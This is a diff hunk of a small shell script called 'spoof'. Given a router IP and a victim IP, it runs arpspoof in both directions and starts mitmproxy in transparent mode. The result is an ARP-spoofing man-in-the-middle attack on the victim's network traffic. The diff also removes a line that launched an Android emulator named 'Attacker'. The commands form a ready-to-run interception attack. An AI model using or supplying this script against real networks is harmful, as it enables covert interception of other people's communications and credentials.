@@ -6,7 +6,6 @@ if [[ "$1" != "" && "$2" != "" ]]; then
 	gnome-terminal --command="arpspoof -i wlan0 -t $2 $1"
 	gnome-terminal --command="arpspoof -i wlan0 -t $1 $2"
 	gnome-terminal --command="mitmproxy --mode transparent --showhost"
-	gnome-terminal --command="/root/Android/Sdk/tools/emulator/emulator -avd Attacker"
 else
 	echo "./spoof [router ip] [victim ip]"
 fi
